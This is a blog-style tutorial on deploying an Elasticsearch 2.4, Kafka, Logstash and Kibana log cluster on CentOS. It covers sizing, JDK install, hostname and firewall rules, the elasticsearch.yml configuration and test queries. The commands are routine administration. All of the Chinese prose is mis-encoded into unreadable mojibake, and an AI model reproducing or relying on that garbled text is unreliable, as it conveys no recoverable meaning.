<h3 id="ç³»ç»Ÿè¦æ±‚"><a href="#ç³»ç»Ÿè¦æ±‚" class="headerlink" title="ç³»ç»Ÿè¦æ±‚"></a>ç³»ç»Ÿè¦æ±‚</h3><p>å¦‚æœä»…ä½œæµ‹è¯•ç”¨, ä¸éœ€è¦ä¸¤å¤©æœºå™¨, å¯ä»¥å°†ä¸¤ä¸ªèŠ‚ç‚¹éƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ä¸Š, å¯¹ç£ç›˜/cpuè¦æ±‚ä¸é«˜, å†…å­˜å¤§äº2gåŸºæœ¬è¶³å¤Ÿäº†</p>
<p>å¦‚æœæ˜¯æ­£å¼ç¯å¢ƒ, éœ€è¦æ ¹æ®æ—¥å¿—é‡è¿›è¡Œè¯„ä¼°, ä¾‹å¦‚, æ¯å¤©æ—¥å¿—é‡å ç¡¬ç›˜çº¦çº¦10G, ä¸”ä¿ç•™30å¤©æ—¥å¿—, åˆ™ç£ç›˜ä¼šå ç”¨çº¦300g, esè®¾å®šçš„é˜ˆå€¼æ˜¯ç£ç›˜ç©ºé—´å æ»¡85%åˆ™æ—¥å¿—å¼€å§‹å‘Šè­¦. æ‰€ä»¥, éœ€è¦è‡³å°‘ 300/0.85=354g.</p>
<p>å‡†å¤‡4å°æœºå™¨, åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…(å¯pingé€š), åˆ†åˆ«åœ¨æ¯å°æœºå™¨ä¸Šéƒ¨ç½²ç›¸åº”esèŠ‚ç‚¹, æ­å»ºä¸€å¥—æ—¥å¿—é›†ç¾¤.</p>
<p>4å°æœºå™¨, æœ€å°‘çš„èµ„æºäº†, ä½†æ˜¯æ²¡æ³•åšåˆ°é«˜å¯ç”¨, æ‰€ä»¥, è¿˜éœ€è¦å†åŠ ä¸€å°æœºå™¨, é˜²æ­¢è„‘è£‚, å…·ä½“è§æœ€å(ä¸¤å°ä¸»åŠ›æœºå™¨+ä¸€å°ç¨³å®šçš„æœºå™¨å°±è¡Œ)</p>
<p>é›†ç¾¤èŠ‚ç‚¹: æœ€å°‘4å°æœºå™¨<br>å†…å­˜: 8GåŠä»¥ä¸Š<br>cpu: 4æ ¸åŠä»¥ä¸Š<br>ç¡¬ç›˜: 800GåŠä»¥ä¸Š, å»ºè®®1T, é›†ç¾¤å®¹é‡çº¦10äº¿çº§(å–å†³äºå¯¹åº”æ—¥å¿—å¤§å°)<br>æ“ä½œç³»ç»Ÿ: centos</p>
<h3 id="å‡†å¤‡å·¥ä½œ-åº”ç”¨-ç½‘ç»œ-ç¯å¢ƒ"><a href="#å‡†å¤‡å·¥ä½œ-åº”ç”¨-ç½‘ç»œ-ç¯å¢ƒ" class="headerlink" title="å‡†å¤‡å·¥ä½œ: åº”ç”¨/ç½‘ç»œ ç¯å¢ƒ"></a>å‡†å¤‡å·¥ä½œ: åº”ç”¨/ç½‘ç»œ ç¯å¢ƒ</h3><p>SLBï¼š é˜¿é‡Œäº‘åšè´Ÿè½½å‡è¡¡&amp; æˆ–è€…è‡ªå·±æ­å»ºnginx</p>
<blockquote>
<p>ELKæœåŠ¡ç«¯é›†ç¾¤ï¼š</p>
</blockquote>
<p>ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼šElasticsearch-2.4.0</p>
<p>es_01 10.47.88.206<br>es_02 10.47.88.188</p>
<blockquote>
<p>KibanaæœåŠ¡ç«¯é›†ç¾¤ï¼š</p>
</blockquote>
<p>ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼škibana-4.5.1</p>
<p>es_01 10.47.88.206<br>es_02 10.47.88.188</p>
<blockquote>
<p>KafKaé›†ç¾¤</p>
</blockquote>
<p>ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼škafka_2.10-0.9</p>
<p>kafka_01 10.46.72.172<br>kafka_02 10.47.88.103<br>kafka_03 10.47.102.137</p>
<blockquote>
<p>zookeeperé›†ç¾¤</p>
</blockquote>
<p>ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼šzookeeper-3.4.6</p>
<p>kafka_01 10.46.72.172<br>kafka_02 10.47.88.103<br>kafka_03 10.47.102.137</p>
<blockquote>
<p>logstash-2.4</p>
</blockquote>
<p>å®¢æˆ·ç«¯ï¼šç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼š logstash-2.4</p>
<p>tomcat-account_01: 10.27.232.85</p>
<p>éƒ½è¦jdk1.8æ”¯æŒã€‚</p>
<h3 id="æ•´ä½“è¯´æ˜"><a href="#æ•´ä½“è¯´æ˜" class="headerlink" title="æ•´ä½“è¯´æ˜"></a>æ•´ä½“è¯´æ˜</h3><h4 id="æ•°æ®æµå‘-gt-æ—¥å¿—-æ¶ˆæ¯æ•´ä½“æµå‘"><a href="#æ•°æ®æµå‘-gt-æ—¥å¿—-æ¶ˆæ¯æ•´ä½“æµå‘" class="headerlink" title="æ•°æ®æµå‘=&gt;æ—¥å¿—/æ¶ˆæ¯æ•´ä½“æµå‘"></a>æ•°æ®æµå‘=&gt;æ—¥å¿—/æ¶ˆæ¯æ•´ä½“æµå‘</h4><p>logstash =&gt; kafka =&gt; logstash =&gt; elasticsearch =&gt; kibana</p>
<h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><h4 id="1-ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…"><a href="#1-ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…" class="headerlink" title="1. ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…"></a>1. ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…</h4><p>esä¾èµ–javaçš„ç‰ˆæœ¬æœ€å°ä¸º1.7</p>
<p>å¦‚æœç³»ç»Ÿä¸­æœªå®‰è£…JDK<br>åˆ™å‘½ä»¤è¿”å›<code>bash: java: command not found,</code> éœ€è¦å®‰è£…<code>JDK</code></p>
<p>å¦‚æœç³»ç»Ÿä¸­å®‰è£…äº†JDK, éœ€ç¡®è®¤ç‰ˆæœ¬æ˜¯å¦å¤§äºjava 1.7, å¦åˆ™éœ€è¦å‡çº§</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">java -version</div><div class="line">java version <span class="string">"1.7.0_51"</span> Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)</div><div class="line"></div><div class="line">å®‰è£…åŠå‡çº§java(æ³¨æ„æ ¹æ®ç³»ç»Ÿä¸åŒè¿è¡Œå¯¹åº”å®‰è£…å‘½ä»¤)</div><div class="line"></div><div class="line"><span class="comment"># Redhat/Centos/Fedora</span></div><div class="line">sudo yum install java-1.7.0-openjdk</div><div class="line"></div><div class="line">æˆ–è€…åˆ°å®˜ç½‘, ä¸‹è½½æœ€æ–°çš„jdkçš„rpmåŒ…, ç„¶åå®‰è£…</div><div class="line"></div><div class="line">wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpm</div><div class="line">rpm -Uvh jdk-8u91-linux-x64.rpm</div></pre></td></tr></table></figure>
<p>å†æ¬¡ç¡®è®¤å®‰è£…æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -version</div></pre></td></tr></table></figure>
<h4 id="åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š"><a href="#åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š" class="headerlink" title="åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š"></a>åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#ä¿®æ”¹hostname</span></div><div class="line">cat /etc/hostname</div><div class="line">es_01</div><div class="line"></div><div class="line"><span class="comment">#ä¿®æ”¹hosts</span></div><div class="line">cat /etc/hosts</div><div class="line">127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4</div><div class="line">::1 localhost localhost.localdomain localhost6 localhost6.localdomain6</div><div class="line">10.47.88.206 es.ihaozhuo.com es_01</div><div class="line"></div><div class="line"><span class="comment">#åˆ·æ–°ç¯å¢ƒ</span></div><div class="line">hostname -F /etc/hostname</div><div class="line"></div><div class="line"><span class="comment">#å¤æŸ¥ç»“æœ</span></div><div class="line">hostname <span class="_">-f</span></div><div class="line">es.ihaozhuo.com</div><div class="line"></div><div class="line">hostname</div><div class="line">es_01</div></pre></td></tr></table></figure>
<h3 id="é˜²ç«å¢™é…ç½®"><a href="#é˜²ç«å¢™é…ç½®" class="headerlink" title="é˜²ç«å¢™é…ç½®"></a>é˜²ç«å¢™é…ç½®</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#service iptables stop</span></div><div class="line"><span class="comment">#setenforce 0</span></div><div class="line"></div><div class="line">ä¸è¿‡è¿™é‡Œæˆ‘é˜²ç«å¢™æ˜¯å¼€å¯çš„ï¼ŒåæœŸæ·»åŠ å‡ºå»ç«¯å£å³å¯ã€‚</div><div class="line">æˆ–è€…å¯ä»¥ä¸å…³é—­é˜²ç«å¢™ï¼Œä½†æ˜¯è¦åœ¨iptablesä¸­æ‰“å¼€ç›¸å…³çš„ç«¯å£ï¼š</div><div class="line"></div><div class="line"><span class="comment"># vim /etc/sysconfig/iptables</span></div><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</div><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT</div><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT</div><div class="line"><span class="comment"># service iptables restart</span></div></pre></td></tr></table></figure>
<h4 id="RPMå¿«é€Ÿå®‰è£…"><a href="#RPMå¿«é€Ÿå®‰è£…" class="headerlink" title="RPMå¿«é€Ÿå®‰è£…"></a>RPMå¿«é€Ÿå®‰è£…</h4><p>elkæ‰€æœ‰å®‰è£…éƒ½å¯ä»¥ä½¿ç”¨rpmäºŒè¿›åˆ¶åŒ…çš„æ–¹å¼,å¢åŠ <code>elasticå®˜ç½‘</code>çš„ä»“åº“repoå°±å¯ä»¥ç”¨yumå®‰è£…äº†</p>
<p>elasticsearchçœ‹è¿™é‡Œ â€”â€“ <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-repositories.html" target="_blank" rel="external">elasticsearch-rpmå®˜æ–¹æ–‡æ¡£</a></p>
<p>logstashçœ‹è¿™é‡Œ â€”-<a href="https://www.elastic.co/guide/en/logstash/current/installing-logstash.html" target="_blank" rel="external">logstash-rpmå®˜ç½‘æ–‡æ¡£</a></p>
<p>kibanaçœ‹è¿™é‡Œ â€”<a href="https://www.elastic.co/guide/en/kibana/current/setup.html" target="_blank" rel="external">kibana-rpmå®˜ç½‘æ–‡æ¡£</a></p>
<h3 id="es-01æœåŠ¡ç«¯æºç å®‰è£…"><a href="#es-01æœåŠ¡ç«¯æºç å®‰è£…" class="headerlink" title="es_01æœåŠ¡ç«¯æºç å®‰è£…"></a>es_01æœåŠ¡ç«¯æºç å®‰è£…</h3><p>è¿™é‡Œæˆ‘æ˜¯æºç å®‰è£…çš„<br>ä¸‹è½½ElasticSearch ElasticSearché»˜è®¤çš„å¯¹å¤–æœåŠ¡çš„HTTPç«¯å£æ˜¯9200ï¼ŒèŠ‚ç‚¹é—´äº¤äº’çš„TCPç«¯å£æ˜¯9300ã€‚</p>
<p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.elastic.co/downloads/elasticsearch" target="_blank" rel="external">Elasticsearch</a></p>
<p>2.4ç‰ˆæœ¬ï¼š<br><a href="https://www.elastic.co/downloads/past-releases/elasticsearch-2-4-3" target="_blank" rel="external">Elasticsearch2.4.3</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">è§£å‹æºç åŒ…ï¼š</div><div class="line">[root@es_01 ~]<span class="comment"># tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/</span></div><div class="line">ç„¶åç»™ç›®å½•åšä¸ªè½¯é“¾æ¥ï¼š</div><div class="line">[root@es_01 <span class="built_in">local</span>]<span class="comment"># ln -s  /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearch</span></div><div class="line"></div><div class="line">è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š</div><div class="line">é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶</div><div class="line">æ–°å»ºç›®å½•, å‡è®¾/data/ç›®å½•æŒ‚è½½çš„ç¡¬ç›˜æœ€å¤§(500Gä»¥ä¸Š)</div><div class="line">[root@es_01 srv]]<span class="comment"># mkdir /srv/data/es-data -p</span></div><div class="line">[root@es_01 srv]<span class="comment"># mkdir /srv/data/es-work </span></div><div class="line"></div><div class="line">[root@es_01 <span class="built_in">local</span>]<span class="comment"># mkdir /usr/local/elasticsearch/logs</span></div><div class="line">[root@es_01 <span class="built_in">local</span>]<span class="comment"># mkdir /usr/local/elasticsearch/config/plugins</span></div><div class="line"></div><div class="line">æ–°å»ºç”¨æˆ·</div><div class="line">ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š</div><div class="line">[root@es_01 elasticsearch]<span class="comment"># useradd  -s /sbin/nologin elasticsearch</span></div><div class="line">[root@es_01 elasticsearch]<span class="comment"># chown -R elasticsearch:elasticsearch /usr/local/elasticsearch</span></div><div class="line">[root@es_01 elasticsearch]<span class="comment"># chown -R elasticsearch:elasticsearch /srv/data/</span></div><div class="line"></div><div class="line"></div><div class="line">åˆ‡æ¢ç”¨æˆ·</div><div class="line">åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·, å¹¶è¿›å…¥elasticsearchç›®å½•</div><div class="line"></div><div class="line">su elasticsearch</div><div class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/elasticsearch/</div></pre></td></tr></table></figure>
<h3 id="é…ç½®Elasticsearchï¼š"><a href="#é…ç½®Elasticsearchï¼š" class="headerlink" title="é…ç½®Elasticsearchï¼š"></a>é…ç½®Elasticsearchï¼š</h3><p>ä»¥ç”¨æˆ·esçš„èº«ä»½è¿›è¡Œæ“ä½œ</p>
<p>æ–‡ä»¶è·¯å¾„: <code>config/elasticsearch.yml</code><br>ä¿®æ”¹è¯¥æ–‡ä»¶ä¸­é…ç½®é¡¹: (æ³¨æ„, åŸå§‹æ–‡ä»¶ä¸­éƒ½æ˜¯è¢«#å·æ³¨é‡Šæ‰äº†, éœ€è¦å»æ‰å¯¹åº”æ³¨é‡Šå¹¶ä¿®æ”¹é…ç½®å€¼)</p>
<ul>
<li>é›†ç¾¤å: cluster.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸€è‡´</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cluster.name: elk_cluster</div></pre></td></tr></table></figure>
<ul>
<li>èŠ‚ç‚¹å: node.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸åŒ, ä¸€å°ä¸º01, å¦ä¸€å°ä¸º02</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> <span class="comment"># ç¬¬ä¸€å°æœºå™¨</span></div><div class="line"> </div><div class="line">node.name: inner_es_node_01</div><div class="line"></div><div class="line"><span class="comment"># ç¬¬äºŒå°æœºå™¨</span></div><div class="line">node.name: inner_es_node_02</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">[root@es_01 config]<span class="comment"># vim elasticsearch.yml</span></div><div class="line"></div><div class="line"><span class="comment"># Use a descriptive name for your cluster:</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#</span></div><div class="line">cluster.name: elk_cluster</div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># ------------------------------------ Node ------------------------------------</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Use a descriptive name for the node:</span></div><div class="line"><span class="comment">#</span></div><div class="line">node.name: es_01</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Add custom attributes to the node:</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># node.rack: r1</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># ----------------------------------- Paths ------------------------------------</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Path to directory where to store the data (separate multiple locations by comma):</span></div><div class="line"><span class="comment">#</span></div><div class="line">path.data: /srv/data/es-data</div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Path to log files:</span></div><div class="line"><span class="comment">#</span></div><div class="line">path.logs: /usr/<span class="built_in">local</span>/elasticsearch/logs</div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># ----------------------------------- Memory -----------------------------------</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Lock the memory on startup:</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># bootstrap.memory_lock: true</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory</span></div><div class="line"><span class="comment"># available on the system and that the owner of the process is allowed to use this limit.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Elasticsearch performs poorly when the system is swapping the memory.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># ---------------------------------- Network -----------------------------------</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Set the bind address to a specific IP (IPv4 or IPv6):</span></div><div class="line"><span class="comment">#</span></div><div class="line">network.host: 10.47.88.206</div></pre></td></tr></table></figure>
<p>åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚</p>
<p>æºç å®‰è£…å¯åŠ¨éœ€è¦æ‰§è¡Œ ï¼š<code>/usr/local/elasticsearch/bin/elasticsearch &amp;</code><br>æ‰èƒ½å¯åŠ¨ï¼›</p>
<h3 id="æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š"><a href="#æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š" class="headerlink" title="æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š"></a>æµ‹è¯•è®¿é—®æœåŠ¡æ­£å¸¸ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[elasticsearch@es_01 elasticsearch]$  curl http://10.47.88.206:9200</div><div class="line">&#123;</div><div class="line">  <span class="string">"name"</span> : <span class="string">"es_01"</span>,</div><div class="line">  <span class="string">"cluster_name"</span> : <span class="string">"elk_cluster"</span>,</div><div class="line">  <span class="string">"cluster_uuid"</span> : <span class="string">"mspLZT5nTL-d124suNbBBQ"</span>,</div><div class="line">  <span class="string">"version"</span> : &#123;</div><div class="line">    <span class="string">"number"</span> : <span class="string">"2.4.3"</span>,</div><div class="line">    <span class="string">"build_hash"</span> : <span class="string">"d38a34e7b75af4e17ead16f156feffa432b22be3"</span>,</div><div class="line">    <span class="string">"build_timestamp"</span> : <span class="string">"2016-12-07T16:28:56Z"</span>,</div><div class="line">    <span class="string">"build_snapshot"</span> : <span class="literal">false</span>,</div><div class="line">    <span class="string">"lucene_version"</span> : <span class="string">"5.5.2"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="string">"tagline"</span> : <span class="string">"You Know, for Search"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ä¸‹é¢æ˜¯å†™å¼€æœºå¯åŠ¨è„šæœ¬ï¼Œä¸å†™çš„ç›´æ¥åˆ‡æ¢esç”¨æˆ·åˆ°ç›®å½•å¯åŠ¨ -dåå°å¯åŠ¨ã€‚<br>è¿™é‡Œéœ€è¦/etc/init.d/åˆ›å»ºå¯åŠ¨è„šæœ¬ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">[root@ELK ~]<span class="comment"># git clone https://github.com/elastic/elasticsearch-servicewrapper.git</span></div><div class="line">Initialized empty Git repository <span class="keyword">in</span> /root/elasticsearch-servicewrapper/.git/</div><div class="line">remote: Counting objects: 184, done.</div><div class="line">remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184</div><div class="line">Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.</div><div class="line">Resolving deltas: 100% (53/53), done.</div><div class="line">[root@ELK elasticsearch-servicewrapper]<span class="comment"># mv service/ /usr/local/elasticsearch/bin/</span></div><div class="line">[root@ELK elasticsearch-servicewrapper]<span class="comment"># cd /usr/local/elasticsearch</span></div><div class="line">[root@ELK elasticsearch]<span class="comment"># /usr/local/elasticsearch/bin/service/elasticsearch install    è¿™é‡Œæ˜¯å®‰è£…es</span></div><div class="line">Detected RHEL or Fedora:</div><div class="line">Installing the Elasticsearch daemon..</div><div class="line">[root@ELK elasticsearch]<span class="comment"># vim /etc/init.d/elasticsearch   æŸ¥çœ‹å®‰è£…eså¯åŠ¨é…ç½®æ–‡ä»¶</span></div><div class="line">[root@ELK elasticsearch]<span class="comment"># service elastic search start  å¯åŠ¨es </span></div><div class="line">Starting Elasticsearch...</div><div class="line">Waiting <span class="keyword">for</span> Elasticsearch......</div><div class="line">running: PID:31360   æœåŠ¡å·²å¯åŠ¨äº†ã€‚</div><div class="line"></div><div class="line">å¯åŠ¨ç›¸å…³æœåŠ¡</div><div class="line">service elasticsearch start</div><div class="line">service elasticsearch status</div><div class="line"></div><div class="line">é…ç½® elasticsearch æœåŠ¡éšç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨</div><div class="line"><span class="comment"># chkconfig --add elasticsearch</span></div><div class="line"></div><div class="line">æµ‹è¯•ElasticSearchæœåŠ¡æ˜¯å¦æ­£å¸¸ï¼Œé¢„æœŸè¿”å›200çš„çŠ¶æ€ç </div><div class="line"><span class="comment"># curl -X GET http://localhost:9200</span></div></pre></td></tr></table></figure>
<h3 id="es-02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š"><a href="#es-02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š" class="headerlink" title="es_02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š"></a>es_02æœåŠ¡ç«¯èŠ‚ç‚¹ï¼š</h3><p>ç¬¬ä¸€æ­¥åŸºç¡€é…ç½®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè·Ÿes_01èŠ‚ç‚¹ä¸€æ ·ã€‚  å…¶ä»–åªéœ€è¦åˆ°es_01æ‹·è´è¿‡æ¥,ç„¶ååˆ›å»ºä¸‹esç”¨æˆ·ï¼Œä¿®æ”¹ä¸‹é…ç½®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">/usr/<span class="built_in">local</span>/elasticsearch  ç›®å½•æ‹·è´åˆ°es_02æœºå™¨ã€‚</div><div class="line">è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š</div><div class="line">é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶</div><div class="line">[root@es_01 srv]]<span class="comment"># mkdir /srv/data/es-data -p</span></div><div class="line">[root@es_01 srv]<span class="comment"># mkdir /srv/data/es-work </span></div><div class="line">ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š</div><div class="line">[root@es_01 elasticsearch]<span class="comment"># useradd  -s /sbin/nologin elasticsearch</span></div><div class="line">[root@es_01 elasticsearch]<span class="comment"># chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*</span></div><div class="line">[root@es_01 elasticsearch]<span class="comment"># chown -R elasticsearch:elasticsearch /srv/data/</span></div><div class="line"></div><div class="line">ä¿®æ”¹é…ç½®æ–‡ä»¶</div><div class="line">vim elasticsearch.yml</div><div class="line">node.name: es_02</div><div class="line">network.host: 10.47.88.188</div><div class="line"></div><div class="line">å…¶ä»–ä¸éœ€è¦ä¿®æ”¹</div></pre></td></tr></table></figure>
<h3 id="é›†ç¾¤èŠ‚ç‚¹es-02æµ‹è¯•ï¼š"><a href="#é›†ç¾¤èŠ‚ç‚¹es-02æµ‹è¯•ï¼š" class="headerlink" title="é›†ç¾¤èŠ‚ç‚¹es_02æµ‹è¯•ï¼š"></a>é›†ç¾¤èŠ‚ç‚¹es_02æµ‹è¯•ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@es_02 home]<span class="comment"># curl http://10.47.88.188:9200</span></div><div class="line">&#123;</div><div class="line">  <span class="string">"name"</span> : <span class="string">"es_02"</span>,</div><div class="line">  <span class="string">"cluster_name"</span> : <span class="string">"elk_cluster"</span>,</div><div class="line">  <span class="string">"cluster_uuid"</span> : <span class="string">"-4Rqn4IzS1GfnsodqZD8Tg"</span>,</div><div class="line">  <span class="string">"version"</span> : &#123;</div><div class="line">    <span class="string">"number"</span> : <span class="string">"2.4.3"</span>,</div><div class="line">    <span class="string">"build_hash"</span> : <span class="string">"d38a34e7b75af4e17ead16f156feffa432b22be3"</span>,</div><div class="line">    <span class="string">"build_timestamp"</span> : <span class="string">"2016-12-07T16:28:56Z"</span>,</div><div class="line">    <span class="string">"build_snapshot"</span> : <span class="literal">false</span>,</div><div class="line">    <span class="string">"lucene_version"</span> : <span class="string">"5.5.2"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="string">"tagline"</span> : <span class="string">"You Know, for Search"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
